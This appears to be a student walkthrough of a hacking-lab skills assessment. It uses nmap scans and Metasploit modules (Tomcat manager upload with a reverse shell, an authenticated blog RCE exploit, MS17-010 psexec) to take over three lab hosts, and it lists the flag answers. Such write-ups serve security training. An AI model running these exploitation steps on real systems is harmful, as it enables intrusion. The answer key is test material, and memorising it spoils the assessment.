### The Live Engagement
Here we are. It’s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.

### Scenario:
CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

### Objectives:
Demonstrate your knowledge of exploiting and receiving an interactive shell from a Windows host or server.
Demonstrate your knowledge of exploiting and receiving an interactive shell from a Linux host or server.
Demonstrate your knowledge of exploiting and receiving an interactive shell from a Web application.
Demonstrate your ability to identify the shell environment you have access to as a user on the victim host.
Complete the objectives by answering the challenge questions below.

### Credentials and Other Needed Info:
**Foothold:**
- IP:
- Credentials: `htb-student / HTB_@cademy_stdnt!` Can be used by RDP.

## Connectivity To The Foothold
**Connection Instructions:**
Accessing the Skills Assessment lab environment will require the use of XfreeRDP to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy VPN key or the Pwnbox built into the module section. You can start the FreeRDP client on the Pwnbox by typing the following into your shell once the target spawns:

Code: bash
```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```
You can find the target `IP`, `Username`, and `Password` needed below:

- Click below in the Questions section to spawn the target host and obtain an IP address.
    - IP ==
    - Username == htb-student
    - Password == HTB_@cademy_stdnt!
Once you initiate the connection, you will be required to enter the provided credentials again in the window you see below:

Skills Assessment
CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (172.16.1.0/23 network) so you may want to pay careful attention to the IP address you pick when starting your listeners.


xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
10.129.213.83

What is the hostname of Host-1? (Format: all lower case)


# Connect to the parrot machine
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!

# Open a terminal and scan ip range 172.16.1.0/23
nmap 172.16.1.0/23

# Three host identified: .11, .12, and .13. Host-1 is .11. Perform a nmap scan on open ports:
sudo nmap -sC -sV 172.16.1.11 -p80,135,139,445,515,1801,2103,2105,2107,3389,8080

# The hostname is displayed
Results: SHELLS-WINSVR

Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)


# The Parrot machine has on Desktop a file called access-creds.txt. It contains several useful creds, such as those of Tomcat service.
# One of the services listed in the nmap scanner in Apache Tomcat 10.0.11 running on 8080. We will exploit that one:
msfconsole -q
search tomcat
use multi/http/tomcat_mgr_upload
set RHOSTS 172.16.1.11
set RPORT 8080
set target Windows Universal
set payload payload/generic/shell_reverse_tcp 
# After gaining access, go to c:\Shares
dir
Results: dev-share

What distribution of Linux is running on Host-2? (Format: distro name, all lower case)


nmap -A 172.16.1.12 -p22,80
Results: Ubuntu

What language is the shell written in that gets uploaded when using the 50064.rb exploit?

Results: php

Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt


# Open firefox writting in the terminal
firefox

# Open the blog in scope http://blog.inlinefreight.local and click on login
# Enter the creds from the access-creds.txt file: admin:admin123!@#
# The new interface allows you to upload certain contents. Open Burpsuite and intercept communications. Also, observe the content of the site. There is a link to https://www.exploit-db.com/exploits/50064 about Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)
# Open a terminal on the Parrot:
searchsploit Lightweight
# You will see 
Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb

# Print the path
searchsploit -m php/webapps/50064.rb

# Create the folders
sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/
sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/

# Copy the exploit
sudo cp 50064.rb mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/

# Reload all modules
reload_all

# Now when searching for Lightweight, we could access the exploit
```bash
search Lightweight
use exploit/php/webapps/50064
options
set RHOSTS 172.16.1.12
set TARGETURI /
set VHOST blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123!@#
run
```
`cat /customscripts/flag.txt`
**Results:** `B1nD_Shells_r_cool`

What is the hostname of Host-3?

```bash
sudo nmap -A 172.16.1.13 -p80,135,139,445
```
Results: SHELLS-WINBLUE

Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt


```bash
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
SET RHOSTS 172.16.1.13
SET LHOST 172.16.1.5
run
``` 
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
**Results:** `One-H0st-Down!`